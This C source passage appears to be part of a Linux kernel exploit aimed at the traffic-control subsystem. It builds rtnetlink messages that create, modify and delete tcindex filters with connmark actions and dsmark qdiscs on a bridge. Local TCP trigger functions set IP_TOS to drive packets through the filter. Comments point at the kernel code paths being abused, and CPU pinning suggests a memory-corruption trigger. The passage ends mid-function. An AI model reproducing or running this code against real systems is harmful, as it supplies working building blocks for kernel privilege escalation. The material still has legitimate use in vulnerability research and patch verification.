
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <unistd.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/netdevice.h>
#include <string.h>
#include <linux/if_ether.h>
#include <linux/pkt_sched.h>
#include <linux/pkt_cls.h>
#include <linux/tc_act/tc_ct.h>
#include <linux/tc_act/tc_connmark.h>
#include <linux/if_tunnel.h>

#include "rtnetlink.h"
#include "cls.h"
#include "log.h"
#include "setup.h"


/**
 * start_echo_sv(): starting the TCP server for sending and receiving network package
*/
void start_echo_sv()
{
    int sfd = 0, sock = 0, r = 0, n = 0;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[1024] = {0};
    char dev_name[] = "br0\0";

    puts("\t[+] start server TCP");
    if ((sfd = socket(AF_INET, SOCK_STREAM, 0)) == 0)
        errout("socket");

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(TRIG_HOST);
    address.sin_port = htons(TRIG_PORT);

    if (bind(sfd, (struct sockaddr *)&address, sizeof(address)) < 0)
        errout("bind");

    printf("\t[+] bind done at: %s:%d\n", TRIG_HOST, TRIG_PORT);
    if (listen(sfd, 3) < 0)
        errout("listen");

    if ((sock = accept(sfd, (struct sockaddr *)&address, (socklen_t *)&addrlen)) < 0)
        errout("accept");

    r = read(sock, buffer, 4);
    printf("\t[*] recv buffer: %s\n", buffer);

    /* write: echo the input string back to the client */
    n = write(sock, buffer, r);
    if (n < 0)
        errout("ERROR writing to socket");
    // sleep(2);

    close(sock);
    close(sfd);

    return;
}

/**
 * classify_tcindex(): starting client for sending and receiving network package
*/
void classify_tcindex()
{
    int sockfd = 0, connfd = 0;
    struct sockaddr_in servaddr, cli;
    char buff[] = "AAAA\0";
    char dev_name[] = "br0\0";
    uint32_t optval = 12;

    sleep(3);
    bzero(&servaddr, sizeof(servaddr));
    bzero(&cli, sizeof(cli));

    printf("\t[+] Connecting to %s:%d...\n", TRIG_HOST, TRIG_PORT);

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1)
        errout("socket");

    if (setsockopt(sockfd, IPPROTO_IP, IP_TOS, &optval, sizeof(optval)))
        errout("setsockopt");

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr(TRIG_HOST);
    servaddr.sin_port = htons(TRIG_PORT);

    if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) != 0)
        errout("connect");

    printf("\t[+] send buffer: %s\n", buff);
    write(sockfd, buff, strlen(buff));

    close(sockfd);

    return;
}
/**
 * rt_addfilter(): create a new tcindex filter operations
 * @sock: socket bound to the route table netlink
 * @link_id: identify id of the link network
 * @hash_value: value for TCA_TCINDEX_HASH atribute
 * @handle: filter handle, using for identify in the list of many filers
 */
void rt_addfilter(int sock, unsigned int link_id, unsigned int hash_value, unsigned int handle)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh;
    struct nlattr *tca;
    struct tcmsg *t;
    int prio, proto;
    char kind_name[] = "tcindex\0";
    char act_kind[] = "connmark\0";
    uint64_t cookie[4] = {0x11};
    struct tc_connmark parms;

    assign_to_core(DEF_CORE);

    puts("[+] rt_addfilter");
    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(CLS_SIZE);
    if (!nlh)
        errout("rt_addfilter malloc");

    memset(nlh, 0, CLS_SIZE);
    nlh->nlmsg_len = CLS_SIZE;
    nlh->nlmsg_type = RTM_NEWTFILTER; // tc_new_tfilter
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_REQUEST; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    t = NLMSG_DATA(nlh);
    prio = 1;
    proto = 0x300; // cmp    ax, 0x300 -> ETH_P_ALL
    t->tcm_info = (prio << 16) | (proto); // prio | protocol
    t->tcm_parent = 0x10000;              // 1:0 handle qdisc 0x10000 ->clid = tcm->tcm_parent; classid
    t->tcm_handle = handle; // handle => f->key
    /* Found link */

    t->tcm_ifindex = link_id; // TCM_IFINDEX_MAGIC_BLOCK
    t->tcm_family = AF_INET; // family -> inet control ?

    memset(&parms, 0, sizeof(struct tc_ct));
    /* prepare asociated attribute */
    tca = (void *)t + NLMSG_ALIGN(sizeof(struct tcmsg));
    tca = set_str_attr(tca, TCA_KIND, kind_name);
    tca = set_nested_attr(tca, TCA_OPTIONS, EXTS_SIZE);    // options
    tca = set_u32_attr(tca, TCA_TCINDEX_HASH, htonl(hash_value));
    tca = set_u32_attr(tca, TCA_TCINDEX_SHIFT, htonl(4));
    tca = set_u16_attr(tca, TCA_TCINDEX_MASK, 8); // p->hash > (p->mask >> p->shift);
    tca = set_u32_attr(tca, TCA_TCINDEX_CLASSID, htonl(0x10001));
    /* Action 0 */
    tca = set_nested_attr(tca, TCA_TCINDEX_ACT, ACT_SIZE); // action
    tca = set_nested_attr(tca, 1, ACT_OPS_SIZE);           // action ops
    tca = set_str_attr(tca, TCA_ACT_KIND, act_kind);       // ct ops => static struct tc_action_ops act_ct_ops = {
    // tca = set_binary_attr(tca, TCA_ACT_COOKIE, cookie, 0x20); // memdup cookie
    tca = set_nested_attr(tca, TCA_ACT_OPTIONS, ACT_INIT_SIZE); // act option init => a_o->init(net, tb[TCA_ACT_OPTIONS]
    parms.index = 12;
    tca = set_binary_attr(tca, TCA_CONNMARK_PARMS, (uint8_t *)&parms, sizeof(struct tc_connmark));


    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl); // tc_new_tfilter
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh);
}

/**
 * rt_add_flow_filter(): create a new flow filter operations
 * @sock: socket bound to the route table netlink
 * @link_id: identify id of the link network
 * @handle: filter handle, using for identify in the list of many filers
 */
void rt_add_flow_filter(int sock, unsigned int link_id, unsigned int handle)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh;
    struct nlattr *tca;
    struct tcmsg *t;
    int prio, proto;
    char kind_name[] = "flow\0";

    assign_to_core(DEF_CORE);

    puts("[+] rt_add_flow_filter");
    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(CLS_SIZE);
    if (!nlh)
        errout("rt_add_flow_filter malloc");

    memset(nlh, 0, CLS_SIZE);
    nlh->nlmsg_len = CLS_SIZE;
    nlh->nlmsg_type = RTM_NEWTFILTER; // tc_new_tfilter
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_REQUEST; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    t = NLMSG_DATA(nlh);
    prio = 1;
    proto = 0x300; // cmp    ax, 0x300 -> ETH_P_ALL
    t->tcm_info = (prio << 16) | (proto); // prio | protocol
    t->tcm_parent = 0x10000;              // 1:0 handle qdisc 0x10000 ->clid = tcm->tcm_parent; classid
    t->tcm_handle = handle; // handle => f->key
    /* Found link */

    t->tcm_ifindex = link_id; // TCM_IFINDEX_MAGIC_BLOCK
    t->tcm_family = AF_INET; // family -> inet control ?

    /* prepare asociated attribute */
    tca = (void *)t + NLMSG_ALIGN(sizeof(struct tcmsg));
    tca = set_str_attr(tca, TCA_KIND, kind_name);
    tca = set_nested_attr(tca, TCA_OPTIONS, EXTS_SIZE);    // options
    tca = set_u32_attr(tca, TCA_FLOW_KEYS, htonl(16));
    tca = set_u32_attr(tca, TCA_FLOW_MODE, htonl(1));


    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl); // tc_new_tfilter
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh);
}

/**
 * rt_getfilter(): get tcindex filter operations
 * @sock: socket bound to the route table netlink
 * @link_id: identify id of the link network
 */
void rt_getfilter(int sock, unsigned int link_id)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh;
    struct nlattr *tca;
    struct tcmsg *t;
    int prio, proto, ret;
    char buf_recv[1024];

    puts("[+] rt_getfilter");
    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(CLS_SIZE);
    if (!nlh)
        errout("rt_getfilter malloc");

    memset(nlh, 0, CLS_SIZE);
    nlh->nlmsg_len = CLS_SIZE;
    nlh->nlmsg_type = RTM_GETTFILTER; // tc_new_tfilter
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_REQUEST; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    t = NLMSG_DATA(nlh);
    prio = 1;
    proto = 0x300; // cmp    ax, 0x300 -> ETH_P_ALL
    t->tcm_info = (prio << 16) | (proto); // prio | protocol
    t->tcm_parent = 0x10000;   
    t->tcm_handle = 1; // handle => f->key
    /* Found link */

    t->tcm_ifindex = link_id;
    t->tcm_family = AF_INET;

    /* prepare asociated attribute */
    tca = (void *)t + NLMSG_ALIGN(sizeof(struct tcmsg));


    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl); // tc_new_tfilter
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    sendmsg(sock, &msg, 0);

    /* receive message */
    iov[0].iov_base = (void *)buf_recv;
    iov[0].iov_len = BUF_SIZE;
    memset(&msg, 0, sizeof(msg));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    ret = recvmsg(sock, &msg, 0);
    if (ret == -1)
        errout("recvmsg");

    hexdump(buf_recv, 0x200);

    /* Free used structures */
    free(nlh);

}

/**
 * rt_delfilter(): delete tcindex filter operations
 * @sock: socket bound to the route table netlink
 * @link_id: identify id of the link network
 * @handle: filter handle, using for identify in the list of many filers
 */
void rt_delfilter(int sock, unsigned int link_id, unsigned int handle)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh;
    struct nlattr *tca;
    struct tcmsg *t;
    int prio, proto;
    char kind_name[] = "tcindex\0";
    char act_kind[] = "connmark\0";
    uint64_t cookie[4] = {0x11};
    struct tc_connmark parms;

    assign_to_core(DEF_CORE);

    puts("[+] rt_delfilter");
    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(CLS_SIZE);
    if (!nlh)
        errout("rt_delfilter malloc");

    memset(nlh, 0, CLS_SIZE);
    nlh->nlmsg_len = CLS_SIZE;
    nlh->nlmsg_type = RTM_DELTFILTER; // tc_del_tfilter
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    t = NLMSG_DATA(nlh);
    prio = 1;
    proto = 0x300; // cmp    ax, 0x300 -> ETH_P_ALL
    t->tcm_info = (prio << 16) | (proto); // prio | protocol
    t->tcm_parent = 0x10000;              // 1:0 handle qdisc 0x10000 ->clid = tcm->tcm_parent; classid
    t->tcm_handle = handle; // handle => f->key
    /* Found link */

    t->tcm_ifindex = link_id; // TCM_IFINDEX_MAGIC_BLOCK
    t->tcm_family = AF_INET; // family -> inet control ?

    memset(&parms, 0, sizeof(struct tc_ct));
    /* prepare asociated attribute */
    tca = (void *)t + NLMSG_ALIGN(sizeof(struct tcmsg));
    tca = set_str_attr(tca, TCA_KIND, kind_name);
    tca = set_nested_attr(tca, TCA_OPTIONS, EXTS_SIZE);    // options
    tca = set_u32_attr(tca, TCA_TCINDEX_HASH, htonl(0x3));
    tca = set_u32_attr(tca, TCA_TCINDEX_SHIFT, htonl(0x3));
    tca = set_u16_attr(tca, TCA_TCINDEX_MASK, htons(8)); // p->hash > (p->mask >> p->shift);
    tca = set_u32_attr(tca, TCA_TCINDEX_CLASSID, htonl(0x10001));
    /* Action 0 */
    tca = set_nested_attr(tca, TCA_TCINDEX_ACT, ACT_SIZE); // action
    tca = set_nested_attr(tca, 1, ACT_OPS_SIZE);           // action ops
    tca = set_str_attr(tca, TCA_ACT_KIND, act_kind);       // ct ops => static struct tc_action_ops act_ct_ops = {
    // tca = set_binary_attr(tca, TCA_ACT_COOKIE, cookie, 0x20); // memdup cookie
    tca = set_nested_attr(tca, TCA_ACT_OPTIONS, ACT_INIT_SIZE); // act option init => a_o->init(net, tb[TCA_ACT_OPTIONS]
    parms.index = 12;
    tca = set_binary_attr(tca, TCA_CONNMARK_PARMS, (uint8_t *)&parms, sizeof(struct tc_connmark));

    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl); // tc_new_tfilter
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh);
}

/**
 * rt_setfilter(): set tcindex filter operations
 * @sock: socket bound to the route table netlink
 * @link_id: identify id of the link network
 */
void rt_setfilter(int sock, unsigned int link_id)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh;
    struct nlattr *tca;
    struct tcmsg *t;
    int prio, proto;
    char kind_name[] = "tcindex\0";
    char act_kind[] = "connmark\0";
    uint64_t cookie[4] = {0x11};
    struct tc_connmark parms;

    printf("[+] rt_setfilter link_id:%d\n", link_id);
    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(CLS_SIZE);
    if (!nlh)
        errout("rt_setfilter malloc");

    memset(nlh, 0, CLS_SIZE);
    nlh->nlmsg_len = CLS_SIZE;
    nlh->nlmsg_type = RTM_NEWTFILTER; // tc_new_tfilter
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    t = NLMSG_DATA(nlh);
    prio = 1;
    proto = 0x300; // cmp    ax, 0x300 -> ETH_P_ALL
    t->tcm_info = (prio << 16) | (proto); // prio | protocol
    t->tcm_parent = 0x10000;              // 1:0 handle qdisc 0x10000
    t->tcm_handle = 1; // handle => f->key
    /* Found link */

    t->tcm_ifindex = link_id; // TCM_IFINDEX_MAGIC_BLOCK
    t->tcm_family = AF_INET; // family -> inet control ?

    memset(&parms, 0, sizeof(struct tc_ct));
    /* prepare asociated attribute */
    tca = (void *)t + NLMSG_ALIGN(sizeof(struct tcmsg));
    tca = set_str_attr(tca, TCA_KIND, kind_name);
    // set_u32_attr(tca, TCA_CHAIN, 0xcafe);
    tca = set_nested_attr(tca, TCA_OPTIONS, EXTS_SIZE);    // options
    tca = set_nested_attr(tca, TCA_TCINDEX_ACT, ACT_SIZE); // action
    tca = set_nested_attr(tca, 1, ACT_OPS_SIZE);           // action ops
    tca = set_str_attr(tca, TCA_ACT_KIND, act_kind);       // ct ops => static struct tc_action_ops act_ct_ops = {
    // tca = set_binary_attr(tca, TCA_ACT_COOKIE, cookie, 0x20); // memdup cookie
    tca = set_nested_attr(tca, TCA_ACT_OPTIONS, ACT_INIT_SIZE); // act option init => a_o->init(net, tb[TCA_ACT_OPTIONS]
    parms.index = 12;
    tca = set_binary_attr(tca, TCA_CT_PARMS, (uint8_t *)&parms, sizeof(struct tc_connmark));

    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl); // tc_new_tfilter
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh);
}

/**
 * rt_getlink(): get link information 
 * @sock: socket bound to the route table netlink
 * @link_name: name of the link (eth0, enp0s33, lo, tunl0, etc)
*/
int rt_getlink(int sock, char *link_name)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh;
    struct nlattr *tb;
    struct ifinfomsg *ifm;
    int prio, proto, ret;
    char buf_recv[BUF_SIZE];

    printf("[+] get_link: %s\n", link_name);
    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(LINK_SIZE);
    if (!nlh)
        errout("rt_getlink malloc");

    memset(nlh, 0, LINK_SIZE);
    nlh->nlmsg_len = LINK_SIZE;
    nlh->nlmsg_type = RTM_GETLINK; // rtnl_getlink
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // infomation
    ifm = NLMSG_DATA(nlh);
    ifm->ifi_family = AF_INET;

    /* prepare asociated attribute */
    tb = (void *)nlh + NLMSG_SPACE(sizeof(struct ifinfomsg));
    tb = set_str_attr(tb, IFLA_IFNAME, link_name);
    // set_u32_attr(tb, TCA_CHAIN, 0xcafe);

    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    sendmsg(sock, &msg, 0);

    /* receive message */
    iov[0].iov_base = (void *)buf_recv;
    iov[0].iov_len = BUF_SIZE;
    memset(&msg, 0, sizeof(msg));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    ret = recvmsg(sock, &msg, 0);
    if (ret == -1)
        errout("recvmsg");

    // hexdump(buf_recv, 0x200);
    ifm = NLMSG_DATA(buf_recv);
    printf("[+] ifi_index: 0x%x\n", ifm->ifi_index);

    /* Free used structures */
    free(nlh);

    /* Receive message */
    return ifm->ifi_index;
}

/**
 * rt_newlink(): create new link 
 * @sock: socket bound to the route table netlink
 * @link_name: name of the new link, maximum size is 16
*/
void rt_newlink(int sock, char *link_name)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh;
    struct nlattr *tb;
    struct ifinfomsg *ifm;
    int prio, proto, ret;
    char kind_ops[] = "bridge\0"; // bridge veth
    char buf_recv[BUF_SIZE];

    printf("[+] new_link: %s\n", link_name);
    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(LINK_SIZE);
    if (!nlh)
        errout("rt_newlink malloc");

    memset(nlh, 0, LINK_SIZE);
    nlh->nlmsg_len = LINK_SIZE;
    nlh->nlmsg_type = RTM_NEWLINK; // rtnl_newlink
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // infomation
    ifm = NLMSG_DATA(nlh);
    ifm->ifi_family = AF_INET;
    ifm->ifi_index = 12;
    ifm->ifi_flags = IFF_UP | IFF_MULTICAST | IFF_DEBUG;

    /* prepare asociated attribute */
    tb = (void *)nlh + NLMSG_SPACE(sizeof(struct ifinfomsg));
    tb = set_u8_attr(tb, IFLA_OPERSTATE, IF_OPER_UP);
    tb = set_str_attr(tb, IFLA_IFNAME, link_name);
    tb = set_nested_attr(tb, IFLA_LINKINFO, LINKINFO_SIZE);
    tb = set_str_attr(tb, IFLA_INFO_KIND, kind_ops);
    tb = set_nested_attr(tb, IFLA_INFO_DATA, LINKDATA_SIZE);

    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh);
}

/**
 * rt_dellink(): delete the exist link 
 * @sock: socket bound to the route table netlink
 * @link_name: name of the new link, maximum size is 16
*/
void rt_dellink(int sock, char *link_name)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh;
    struct nlattr *tb;
    struct ifinfomsg *ifm;
    int prio, proto, ret;
    // char link_name[] = "tunl0\0"; // enps03 fails
    char buf_recv[BUF_SIZE];

    printf("[+] del link: %s\n", link_name);
    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(LINK_SIZE);
    if (!nlh)
        errout("rt_dellink malloc");

    memset(nlh, 0, LINK_SIZE);
    nlh->nlmsg_len = LINK_SIZE;
    nlh->nlmsg_type = RTM_DELLINK; // rtnl_dellink
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // infomation
    ifm = NLMSG_DATA(nlh);
    ifm->ifi_family = AF_INET;

    /* prepare asociated attribute */
    tb = (void *)nlh + NLMSG_SPACE(sizeof(struct ifinfomsg));
    // tb = set_nested_attr(tb, IFLA_LINKINFO, sizeof(struct nlattr)+8);
    tb = set_str_attr(tb, IFLA_IFNAME, link_name);

    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh);
}

/**
 * rt_setlink(): set the exist link 
 * @sock: socket bound to the route table netlink
 * @link_id: identify link
*/
void rt_setlink(int sock, unsigned int link_id)
{

    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh;
    struct nlattr *tb;
    struct ifinfomsg *ifm;
    int prio, proto, ret;
    char buf_recv[BUF_SIZE];
    char mac_addr[7] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x00};

    assign_to_core(DEF_CORE);

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(LINK_SIZE);
    if (!nlh)
        errout("rt_setlink malloc");

    memset(nlh, 0, LINK_SIZE);
    nlh->nlmsg_len = LINK_SIZE;
    nlh->nlmsg_type = RTM_SETLINK; // rtnl_setlink
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // infomation
    ifm = NLMSG_DATA(nlh);
    ifm->ifi_family = AF_INET;
    ifm->ifi_index = link_id;
    ifm->ifi_flags = IFF_MULTICAST | IFF_BROADCAST | IFF_UP; // IFF_MULTICAST IFF_DEBUG IFF_UP

    /* prepare asociated attribute */
    tb = (void *)ifm + NLMSG_ALIGN(sizeof(struct ifinfomsg));
    tb = set_u8_attr(tb, IFLA_OPERSTATE, IF_OPER_UP);

    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh);
}

/**
 * rt_newqdisc(): create new queue discipline
 * @sock: socket bound to the route table netlink
 * @link_id: identify link
 * @hanle: qdisc hanlde
*/
void rt_newqdisc(int sock, unsigned int link_id, unsigned int handle)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh = NULL;
    struct nlattr *tca;
    struct tcmsg *tcm;
    int prio, proto;
    char qdisc_ops[] = "dsmark\0"; // pfifo

    assign_to_core(DEF_CORE);

    printf("[+] rt_newqdisc with link_id: 0x%x\n", link_id);
    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(QDISC_SIZE);
    if (!nlh) {
        errout("rt_newqdisc malloc");
    }

    memset(nlh, 0, QDISC_SIZE);
    nlh->nlmsg_len = QDISC_SIZE;
    nlh->nlmsg_type = RTM_NEWQDISC; // tc_modify_qdisc
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_REQUEST | NLM_F_REPLACE; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    tcm = NLMSG_DATA(nlh);
    // prio = 1;
    // proto = ETH_P_IP;
    // tcm->tcm_info = (prio<<16) | (proto); // prio | protocol
    tcm->tcm_ifindex = link_id; // TCM_IFINDEX_MAGIC_BLOCK
    tcm->tcm_family = AF_INET;
    tcm->tcm_parent = 0xFFFFFFFF; // clid = TC_H_ROOT = 0xFFFFFFFF , TC_H_INGRESS    (0xFFFFFFF1)
    tcm->tcm_handle = handle;    // 0xffff0000 0x10000 1:0 qdisc handle  --> need if (tcm->tcm_handle)  -> fail

    /* prepare asociated attribute */
    tca = (void *)tcm + NLMSG_ALIGN(sizeof(struct tcmsg));
    tca = set_str_attr(tca, TCA_KIND, qdisc_ops);
    tca = set_nested_attr(tca, TCA_OPTIONS, DSMARK_SIZE);
    tca = set_u16_attr(tca, TCA_DSMARK_INDICES, 64);
    tca = set_u16_attr(tca, TCA_DSMARK_DEFAULT_INDEX, 100);
    tca = set_flag_attr(tca, TCA_DSMARK_SET_TC_INDEX);

    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh);
}

/**
 * rt_getclass(): get class
 * @sock: socket bound to the route table netlink
 * @link_id: identify link
*/
void rt_getclass(int sock, unsigned int link_id)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh = NULL;
    struct nlattr *tca;
    struct tcmsg *tcm;
    int prio, proto;
    char qdisc_ops[] = "dsmark\0"; // pfifo

    printf("[+] rt_addqdisc with link_id: 0x%x\n", link_id);
    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(ADD_CLASS);
    if (!nlh) {
        errout("rt_addqdisc malloc");
    }

